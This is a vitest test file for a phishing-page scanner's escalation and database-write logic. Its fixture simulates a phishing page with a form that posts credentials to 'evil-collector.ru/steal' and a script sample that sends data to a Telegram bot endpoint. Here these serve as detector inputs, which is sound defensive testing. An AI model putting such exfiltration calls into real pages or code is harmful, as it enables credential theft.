import { describe, it, expect, vi } from "vitest";
import type {
  PagePhishingResult,
  ParsedPageSignals,
} from "../src/lib/page-phishing-scorer";
import type { Env } from "../src/types";

// The success-path regression test below needs a controlled
// SuspectPageResult (bypassing HTMLRewriter, which this plain-node
// vitest env doesn't provide — same gap page-fetch-antibot-wall.test.ts
// documents) so it can drive runPageAnalysisForDomain's success branch
// deterministically. vi.hoisted + vi.mock, defaulting through to the
// REAL implementation, keeps every other test in this file (which
// exercises the real SSRF-block failure path) unaffected.
const { fetchSuspectPageSpy } = vi.hoisted(() => ({ fetchSuspectPageSpy: vi.fn() }));
vi.mock("../src/lib/page-fetch", async (importOriginal) => {
  const actual = await importOriginal<typeof import("../src/lib/page-fetch")>();
  fetchSuspectPageSpy.mockImplementation(actual.fetchSuspectPage);
  return { ...actual, fetchSuspectPage: fetchSuspectPageSpy };
});

const {
  applyEscalation,
  runPageAnalysisForDomain,
} = await import("../src/scanners/lookalike-page-analysis");
type PageAnalysisRow = import("../src/scanners/lookalike-page-analysis").PageAnalysisRow;
const { scorePagePhishing } = await import("../src/lib/page-phishing-scorer");

// ─── Minimal in-memory D1 mock ────────────────────────────────────
// Interprets exactly the UPDATE shapes issued by lookalike-page-analysis
// so we can assert real write behavior (not just captured SQL strings).

const SEVERITY_RANK: Record<string, number> = { low: 0, medium: 1, high: 2, critical: 3 };
const OPEN_STATUSES = new Set(["new", "acknowledged", "investigating"]);
const NOW_MARKER = "MOCK_NOW";

interface LookalikeRow {
  id: string;
  page_fetched_at: string | null;
  page_http_status: number | null;
  page_phishing_score: number | null;
  page_signals: string | null;
  page_content_hash: string | null;
  threat_level: string | null;
  // Lane 3 (migration 0264) — written only by the success UPDATE.
  page_anti_bot_wall?: string | null;
  page_ai_signals?: string | null;
  page_score_delta?: number | null;
  page_generator?: string | null;
  page_exfil_sink?: string | null;
  page_exfil_sink_id?: string | null;
  page_evidence?: string | null;
}
interface AlertRow {
  id: string;
  severity: string;
  status: string;
}

function makeMockEnv(lookalikes: LookalikeRow[], alerts: AlertRow[]): {
  env: Env;
  lookalikes: Map<string, LookalikeRow>;
  alerts: Map<string, AlertRow>;
} {
  const lMap = new Map(lookalikes.map((r) => [r.id, r]));
  const aMap = new Map(alerts.map((r) => [r.id, r]));

  const DB = {
    prepare(sql: string) {
      return {
        bind(...args: unknown[]) {
          return {
            async run() {
              if (sql.includes("UPDATE alerts")) {
                // args: [severityLower, alertId, boundRank]
                const [sev, id, boundRank] = args as [string, string, number];
                const row = aMap.get(id);
                if (row && OPEN_STATUSES.has(row.status)) {
                  const cur = SEVERITY_RANK[row.severity] ?? 0;
                  if (cur < boundRank) row.severity = sev;
                }
              } else if (sql.includes("SET threat_level = ?")) {
                const [level, id] = args as [string, string];
                const row = lMap.get(id);
                if (row) row.threat_level = level;
              } else if (sql.includes("page_phishing_score = ?")) {
                // Full-verdict (success) update — 12 binds, matching the
                // real UPDATE's column list 1:1 (status, score, signals,
                // hash, antiBotWallFamily, aiSignals, scoreDelta,
                // pageGenerator, exfilSink, exfilSinkId, evidence, id).
                // Defect 7.1: this used to destructure only 5, so `id`
                // silently received `antiBotWallFamily` and the row
                // lookup below missed every time — the success path was
                // a no-op in tests. See the "12-bind arity" describe
                // block for the regression test.
                const [
                  status, score, signals, hash, antiBotWallFamily,
                  aiSignals, scoreDelta, pageGenerator, exfilSink,
                  exfilSinkId, evidence, id,
                ] = args as [
                  number | null, number, string, string | null, string | null,
                  string, number, string | null, string | null,
                  string | null, string | null, string,
                ];
                const row = lMap.get(id);
                if (row) {
                  row.page_fetched_at = NOW_MARKER;
                  row.page_http_status = status;
                  row.page_phishing_score = score;
                  row.page_signals = signals;
                  row.page_content_hash = hash;
                  row.page_anti_bot_wall = antiBotWallFamily;
                  row.page_ai_signals = aiSignals;
                  row.page_score_delta = scoreDelta;
                  row.page_generator = pageGenerator;
                  row.page_exfil_sink = exfilSink;
                  row.page_exfil_sink_id = exfilSinkId;
                  row.page_evidence = evidence;
                }
              } else if (sql.includes("lookalike_domains") && sql.includes("page_http_status = ?")) {
                // Failure update — cooldown + status only, verdict preserved.
                const [status, id] = args as [number | null, string];
                const row = lMap.get(id);
                if (row) {
                  row.page_fetched_at = NOW_MARKER;
                  row.page_http_status = status;
                }
              }
              return { meta: { changes: 1 } };
            },
          };
        },
      };
    },
  };

  return { env: { DB } as unknown as Env, lookalikes: lMap, alerts: aMap };
}

// ─── Finding 1 — monotonic alert-severity escalation ──────────────

describe("applyEscalation — alert severity is raised monotonically only", () => {
  const phishingHigh: PagePhishingResult = {
    score: 60,
    signals: [],
    credentialHarvest: false,
    antiBotWallFamily: null,
    aiSignals: [],
    scoreDelta: 0,
    evidence: {},
    pageGenerator: null,
    exfilSink: null,
    exfilSinkId: null,
  };

  it("does NOT downgrade an analyst-escalated critical alert when the page verdict is HIGH", async () => {
    const { env, alerts, lookalikes } = makeMockEnv(
      [{ id: "l1", page_fetched_at: null, page_http_status: null, page_phishing_score: null, page_signals: null, page_content_hash: null, threat_level: "MEDIUM" }],
      [{ id: "a1", severity: "critical", status: "new" }],
    );
    const row: PageAnalysisRow = {
      id: "l1", brand_id: "b1", domain: "phish.example", threat_level: "MEDIUM",
      alert_id: "a1", brand_name: "Acme", brand_domain: "acme.com",
    };
    const escalated = await applyEscalation(env, row, phishingHigh);
    expect(escalated).toBe(true); // lookalike level rose MEDIUM → HIGH
    expect(lookalikes.get("l1")!.threat_level).toBe("HIGH");
    // ...but the alert's higher manual severity is preserved.
    expect(alerts.get("a1")!.severity).toBe("critical");
  });

  it("raises a lower alert severity up to the new level", async () => {
    const { env, alerts } = makeMockEnv(
      [{ id: "l2", page_fetched_at: null, page_http_status: null, page_phishing_score: null, page_signals: null, page_content_hash: null, threat_level: "MEDIUM" }],
      [{ id: "a2", severity: "low", status: "new" }],
    );
    const row: PageAnalysisRow = {
      id: "l2", brand_id: "b1", domain: "phish.example", threat_level: "MEDIUM",
      alert_id: "a2", brand_name: "Acme", brand_domain: "acme.com",
    };
    await applyEscalation(env, row, phishingHigh);
    expect(alerts.get("a2")!.severity).toBe("high");
  });

  it("returns false and touches nothing when the page verdict does not exceed the current level", async () => {
    const { env, alerts, lookalikes } = makeMockEnv(
      [{ id: "l3", page_fetched_at: null, page_http_status: null, page_phishing_score: null, page_signals: null, page_content_hash: null, threat_level: "HIGH" }],
      [{ id: "a3", severity: "high", status: "new" }],
    );
    const row: PageAnalysisRow = {
      id: "l3", brand_id: "b1", domain: "phish.example", threat_level: "HIGH",
      alert_id: "a3", brand_name: "Acme", brand_domain: "acme.com",
    };
    // score 60 → HIGH, not > HIGH.
    const escalated = await applyEscalation(env, row, phishingHigh);
    expect(escalated).toBe(false);
    expect(lookalikes.get("l3")!.threat_level).toBe("HIGH");
    expect(alerts.get("a3")!.severity).toBe("high");
  });
});

// ─── Finding 3 — failed fetch preserves the prior verdict ─────────

describe("runPageAnalysisForDomain — failed fetch keeps the last good verdict", () => {
  it("advances the cooldown but does NOT wipe score/signals/hash on a blocked fetch", async () => {
    const { env, lookalikes } = makeMockEnv(
      [{
        id: "l4",
        page_fetched_at: "2020-01-01T00:00:00Z",
        page_http_status: 200,
        page_phishing_score: 75,
        page_signals: JSON.stringify(["credential_form", "offdomain_form_exfil"]),
        page_content_hash: "deadbeef",
        threat_level: "CRITICAL",
      }],
      [],
    );

    // A host that fails the SSRF static gate blocks instantly (no network),
    // so fetchSuspectPage returns ok:false and phishing is null.
    const { result, phishing } = await runPageAnalysisForDomain(
      env,
      { id: "l4", domain: "127.0.0.1", brand_name: "Acme", brand_domain: "acme.com" },
      Date.now() + 5000,
    );

    expect(result.ok).toBe(false);
    expect(phishing).toBeNull();

    const row = lookalikes.get("l4")!;
    // Cooldown advanced...
    expect(row.page_fetched_at).toBe(NOW_MARKER);
    // ...but the prior verdict + change-detection baseline are intact.
    expect(row.page_phishing_score).toBe(75);
    expect(row.page_signals).toBe(JSON.stringify(["credential_form", "offdomain_form_exfil"]));
    expect(row.page_content_hash).toBe("deadbeef");
  });
});

// ─── Defect 7.1 — success UPDATE binds 12 values, not 5 ───────────
//
// This is the regression test for the bug the spec verifies at
// lookalike-page-analysis.ts:94-104 (six new Lane 3 columns joined the
// pre-existing six): the mock's destructure used to read only
// [status, score, signals, hash, id], so `id` actually received
// `antiBotWallFamily` and `lMap.get(id)` missed on every call — the
// success-path write was a SILENT NO-OP. It went unnoticed because the
// only test exercising runPageAnalysisForDomain covered the failure
// path (above). With the fix, this test fails loudly if the bind order
// / column mapping ever drifts again.

describe("runPageAnalysisForDomain — success path writes all 12 bound columns to the right row", () => {
  const signals: ParsedPageSignals = {
    hasPasswordInput: true,
    formActions: ["https://evil-collector.ru/steal"],
    resourceUrls: [],
    iconHrefs: [],
    metaRefresh: null,
    scriptRedirectTargets: [],
    title: "vite app",
    bodyTextSample: "Welcome {{user.name}} to our totally real portal",
    antiBotWall: null,
    scriptTextSample: "fetch('https://api.telegram.org/bot123456789:ABC-token/sendMessage')",
    scriptSinkTargets: ["api.telegram.org/bot123456789:ABC-token/sendMessage"],
    commentSamples: [],
    metaGenerator: "Next.js",
    svgScriptPayload: false,
    svgDownloadDisguise: false,
  };

  it("maps every bind to its own column — real score/signals AND the Lane 3 shadow columns", async () => {
    const { env, lookalikes } = makeMockEnv(
      [{
        id: "l5",
        page_fetched_at: null,
        page_http_status: null,
        page_phishing_score: null,
        page_signals: null,
        page_content_hash: null,
        threat_level: "LOW",
      }],
      [],
    );

    fetchSuspectPageSpy.mockImplementationOnce(async () => ({
      ok: true,
      httpStatus: 200,
      contentHash: "cafef00d",
      signals,
    }));

    // The same brand context runPageAnalysisForDomain will pass to the
    // real scorer — computing the expected verdict independently, from
    // the SAME pure inputs, rather than hand-asserting magic numbers.
    const expected = scorePagePhishing(signals, {
      suspectDomain: "vite-scaffold-phish.example",
      brandDomain: "acme.com",
      brandName: "Acme",
    });
    // Sanity: this fixture is meant to exercise BOTH the real signal
    // path and every Lane 3 shadow column with a non-default value —
    // otherwise a positional shift could still slip past a test whose
    // expected values happen to collide with the row's initial nulls.
    expect(expected.credentialHarvest).toBe(true);
    expect(expected.aiSignals.length).toBeGreaterThan(0);
    expect(expected.exfilSinkId).not.toBeNull();
    expect(expected.pageGenerator).not.toBeNull();

    const { result, phishing } = await runPageAnalysisForDomain(
      env,
      { id: "l5", domain: "vite-scaffold-phish.example", brand_name: "Acme", brand_domain: "acme.com" },
      Date.now() + 5000,
    );

    expect(result.ok).toBe(true);
    expect(phishing).toEqual(expected);

    const row = lookalikes.get("l5")!;
    expect(row.page_fetched_at).toBe(NOW_MARKER);
    expect(row.page_http_status).toBe(200);
    // Real score/signals/hash land in their own columns...
    expect(row.page_phishing_score).toBe(expected.score);
    expect(row.page_signals).toBe(JSON.stringify(expected.signals));
    expect(row.page_content_hash).toBe("cafef00d");
    expect(row.page_anti_bot_wall).toBe(expected.antiBotWallFamily);
    // ...and the six Lane 3 shadow-mode columns land in THEIRS, not
    // shifted by one into a neighboring column or into `id`.
    expect(row.page_ai_signals).toBe(JSON.stringify(expected.aiSignals));
    expect(row.page_score_delta).toBe(expected.scoreDelta);
    expect(row.page_generator).toBe(expected.pageGenerator);
    expect(row.page_exfil_sink).toBe(expected.exfilSink);
    expect(row.page_exfil_sink_id).toBe(expected.exfilSinkId);
    expect(row.page_evidence).toBe(JSON.stringify(expected.evidence));
  });
});
